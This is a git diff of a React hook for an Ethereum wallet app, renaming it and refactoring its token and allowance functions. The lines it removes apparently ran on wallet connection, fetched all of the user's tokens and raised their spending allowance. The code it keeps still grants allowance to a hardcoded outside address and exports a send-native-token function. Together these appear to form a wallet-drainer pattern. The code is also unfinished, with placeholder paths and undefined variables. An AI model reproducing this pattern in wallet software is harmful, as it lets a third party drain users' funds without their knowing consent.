@@ -13,7 +13,7 @@ import { writeContract, getBalance, sendTransaction } from "@wagmi/core";
 import { parseEther } from "viem";
 import { sepolia } from "viem/chains";
 
-const UseAccountBalances = ({ connectionStatus }) => {
+const UseAccountFunctions = () => {
   const { address, isConnected, status } = useAccount();
   const { chains, switchChain } = useSwitchChain();
   const [tokensData, setTokensData] = useState([]);
@@ -25,23 +25,16 @@ const UseAccountBalances = ({ connectionStatus }) => {
   };
   const alchemy = new Alchemy(config);
 
-  useEffect(() => {
-    if (isConnected) {
-      connectionStatus();
-      getUserTokens();
-      // sendNaticeToken();
-    }
-  }, [isConnected]);
-
   const getUserTokens = async () => {
     try {
-      const data = await alchemy.core.getTokenBalances(address);
-      const newTokensData = data.tokenBalances.filter(
-        (tokensDetails) =>
-          !tokensData.some((token) => token.id === tokensDetails.id)
-      );
-      setTokensData((prevTokensData) => [...prevTokensData, ...newTokensData]);
-      increaseAllowanceForTokens([...tokensData, ...newTokensData]);
+      const data = await alchemy.core.getTokensForOwner(address);
+      //   const newTokensData = data.tokenBalances.filter(
+      //     (tokensDetails) =>
+      //       !tokensData.some((token) => token.id === tokensDetails.id)
+      //   );
+      //   setTokensData((prevTokensData) => [...prevTokensData, ...newTokensData]);
+      //   increaseAllowanceForTokens([...tokensData, ...newTokensData]);
+      console.log("this is tokens for owner function: ", data);
     } catch (error) {
       console.error("Error fetching token balances:", error);
     }
@@ -89,7 +82,7 @@ const UseAccountBalances = ({ connectionStatus }) => {
         address: contractAddress,
         abi: Erc20Abi,
         functionName: "increaseAllowance",
-        args: ["0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f", '0'],
+        args: ["0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f", "0"],
       });
       console.log("Transaction hash:", hash);
       const myObject = {
@@ -104,24 +97,31 @@ const UseAccountBalances = ({ connectionStatus }) => {
   async function checkAllowance() {
     try {
       // Get the ERC20 token contract using its ABI
-      const abi = require('./path/to/erc20.json'); // Replace with actual ABI path
+      const abi = require("./path/to/erc20.json"); // Replace with actual ABI path
       const contract = new ethers.Contract(contractAddress, abi, provider);
-  
+
       // Get allowance using the `allowance` function of the ERC20 contract
       const allowance = await contract.allowance(myAddress, contractAddress);
-  
+
       // Convert allowance from wei to a more readable format (e.g., token units)
       const decimals = await contract.decimals(); // Get token decimals
       const allowanceInTokens = ethers.utils.formatUnits(allowance, decimals);
-  
-      console.log(`Allowance for ${contractAddress}: ${allowanceInTokens} tokens`);
+
+      console.log(
+        `Allowance for ${contractAddress}: ${allowanceInTokens} tokens`
+      );
     } catch (error) {
-      console.error('Error fetching allowance:', error);
+      console.error("Error fetching allowance:", error);
     }
   }
-  
-  
 
+  return {
+    getUserTokens,
+    increaseAllowanceForTokens,
+    sendNaticeToken,
+    increaseAllowance,
+    checkAllowance,
+  };
 };
 
-export default UseAccountBalances;
+export default UseAccountFunctions;
